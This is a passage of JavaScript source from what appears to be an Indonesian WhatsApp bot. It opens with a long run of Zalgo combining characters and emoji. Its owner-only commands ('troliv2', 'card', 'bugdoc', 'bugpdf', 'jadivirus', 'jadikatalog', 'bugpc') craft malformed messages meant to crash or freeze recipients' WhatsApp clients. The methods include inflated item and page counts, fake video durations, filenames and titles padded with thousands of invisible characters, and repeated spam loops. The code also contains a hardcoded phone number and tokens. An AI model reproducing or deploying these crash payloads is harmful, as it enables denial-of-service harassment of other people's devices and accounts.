̡͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥️`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": virgam,
    "contextInfo": {
      "forwardingScore": 150,
      "isForwarded": false
    }
  }
}, {quoted:floc, contextInfo:{}}) 
Hanz.relayWAMessage(res)
break 
case 'troliv2': // BUG TROLLI + BUG GC
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
buf = fs.readFileSync('./media/Bot.jpg')
imeu = await Hanz.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hanz.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": virgam,
"itemCount": 2021,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "BENTAR LAGI 2022 UBAH ITEM COUNT NYA JADI 2022",
"message":"HANZ々OFC彡",
"sellerJid": "6283144394823@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
"totalAmount1000": "Rp 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 
Hanz.relayWAMessage(res)
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
break

case 'kontag':
				if (!isGroup) return reply(mess.only.group)
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break		
case 'card':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!arg) return replyy(`Penggunaan ${prefix}troli teks|jumlah`)
reply(mess.wait)
argzi = arg.split("|")
if (Number(argzi[1]) >= 10) return replyy('Kebanyakan Delay Wea ku su!')
if (isNaN(argzi[1])) return reply(`harus berupa angka`)
for (let i = 0; i < argzi[1]; i++){
njir = await Hanz.prepareMessageFromContent(from, {"orderMessage": {"orderId": "792749621388119", "sellerJid": "6283144394823@s.whatsapp.net", "thumbnail": fs.readFileSync('./media/virgam.jpeg'), "itemCount": 2022, "status": "INQUIRY", "surface": "CATALOG", "message": `${argzi[0]}`, "orderTitle": "6283144394823@s.whatsapp.net", "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==" }, "totalAmount1000": "Rp 99.99999999999999999999", "totalCurrencyCode": "IDR", "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:ftrol, contextInfo:{}}) 
Hanz.relayWAMessage(njir)}
break
case "jadivirkon":
reply(mess.wait)
        pe = args.join("");        
        nah = pe.split("|")[1];
        entah = pe.split("|")[0];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        Hanz.sendMessage(
          from,
          { displayName: `${nah}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${hanz(prefix)}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
case 'bugdoc': 
  if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
hmm6 = fs.readFileSync('./media/Hanz.txt')
Hanz.sendMessage(from, hmm6, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${virtex7(prefix)}${virtex7(prefix)}${virtex7(prefix)}${virtex7(prefix)}.txt`, mimetype: 'application/txt'})
break
case 'bugpdf':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
hm = fs.readFileSync('./media/HANZ々OFC彡️.pdf')
Hanz.sendMessage(from, hm, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️️',
    orderTitle: 'bugpdf〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, pageCount: 9999999,filename:`${ngazap(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: image}) 
 break
 
 case 'jadivirus':
 if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
 reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               Hanz.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, mek})
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, image, { thumbnail : virgam, mek, options})
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               Hanz.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, mek})
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
          Hanz.sendMessage(from, ini_buffer, video, {mimetype: 'video/mp4', duration: 359996400, quoted: mek})
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/video dengan caption ${prefix}jadivirus`)
        }
        break        
				  case 'jadivirvid':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
reply(mess.wait)
if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Hanz.downloadMediaMessage(swsw)
            Hanz.sendMessage(from,cihcih, video, {mimetype: 'video/mp4', duration: 359996400,thumbnail:virgam,caption: 'Nih Dah Jadi Kontol'})
            } else {
            replyy('reply videonya!')
            }
            break 
            case 'jadivirvid2':
            if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
            reply(mess.wait)
if (isQuotedSticker) {
            const swsw = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Hanz.downloadMediaMessage(swsw)
            Hanz.sendMessage(from,cihcih, video, {mimetype: 'video/mp4', duration: 359996400,thumbnail:virgam,caption: 'Nih Dah Jadi Kontol'})
            } else {
            replyy('reply Sticker nya!')
            }
            break
        case 'tovirgam':
  case 'jadivirgam':
  if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
					if (!isQuotedSticker) return reply('Reply stiker nya')
					reply(mess.wait)
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							Hanz.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Dah Jadi Di coba dulu asu'})
							fs.unlinkSync(ran)
						})
					}
					break
				
case 'jadikatalog':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
reply(mess.wait)
if (!q) return reply('(jadivcatalog teksnya + reply gambar nya')
const tokatalog = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
vkatalog = await Hanz.downloadMediaMessage(tokatalog)
imeu = await Hanz.prepareMessage('0@s.whatsapp.net', vkatalog, image)
imeg = imeu.message.imageMessage
y = await Hanz.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg, 
  "title": `${q}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`,
"description": `${api(prefix)}🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥️️`,
  "footerText": `メHANZ OFC`,
            "currencyCode": "USD",
            "priceAmount1000": "0",
            "productImageCount": 1,
            "firstImageId": 1,
            "salePriceAmount1000": "99.99999999999999999999",
            "retailerId": `All Menu Catalog`,
            "url": "Haris Ganteng"
            },
            "businessOwnerJid": "6283144394823@s.whatsapp.net",
            }
            }, { quoted: mek, thumbnail:virgam, mimetype: 'image/jpeg' })
            Hanz.relayWAMessage(y)		
  break
  case 'bugpc':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
res = await Hanz.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6283144394823@g.us",
"inviteCode": "Xs6pyCFy17jkiIUF",
"inviteExpiration": "1640935315",
"inviteTime": "1640676120846",
